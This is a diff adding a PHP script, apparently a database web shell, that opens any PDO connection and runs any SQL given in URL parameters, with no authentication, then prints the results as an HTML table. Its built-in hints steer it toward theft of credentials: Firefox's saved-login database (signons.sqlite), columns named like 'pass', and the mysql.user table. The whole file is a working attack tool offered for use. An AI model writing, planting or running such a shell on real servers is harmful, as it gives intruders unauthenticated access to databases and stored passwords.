@@ -1,0 +1,52 @@
+<pre>
+Connect to any supported PDO database
+Args:
+  - connection: 
+    - "mysql:host=localhost;dbname=wordpress;port=3306"
+    - "pgsql:host=localhost;dbname=something;port=5432"
+    - "sqlite:/home/user/.mozilla/firefox/<path>/signons.sqlite"
+    - "sqlsrv:Database=something;Server=localhost"
+    - "oci:dbname=yoursid" (defined in tnsnames.ora)
+    - "oci:dbname=//localhost:1521/mydb" (via instantclient)
+  - user 
+  - pass
+  - sql
+<?php
+  /*
+    Useful commands
+  */
+  if( empty( $_GET["sql"] ) ){
+    echo "SELECT @@version\n";
+    echo "SELECT * FROM information_schema.columns where column_name like '%pass%'\n";
+    echo "SHOW TABLES\n";
+    echo "SELECT * FROM mysql.user\n";
+    exit;
+  }
+  if( empty( $_GET["connection"] ) ){
+    exit;
+  }
+  $db = new PDO( $_GET["connection"], $_GET["user"], $_GET["pass"] );
+  if( !$db ) die("Failed to connect to ".$_GET["connection"] );
+  $stmt = $db->query( $_GET["sql"] );
+  echo "Error: ".$stmt->errorInfo()."\n";
+  echo "Rows: ".$stmt->rowCount()."\n";
+  echo "Results:\n";
+  $count = 0;
+  while( $row = $stmt->fetch( PDO::FETCH_ASSOC ) ){
+    if( $count == 0 ){
+      echo "<table><tr>";
+      foreach( $row as $k => $v ){
+        echo "<th>$k</th>";
+      }
+      echo "</tr>\n";
+    }
+    echo "<tr>";
+    foreach( $row as $k => $v ){
+      echo "<td>".htmlentities($v)."</td>";
+    }
+    echo "</tr>\n";
+    $count++;
+  }
+  echo "</table>";
+?>
+</pre>
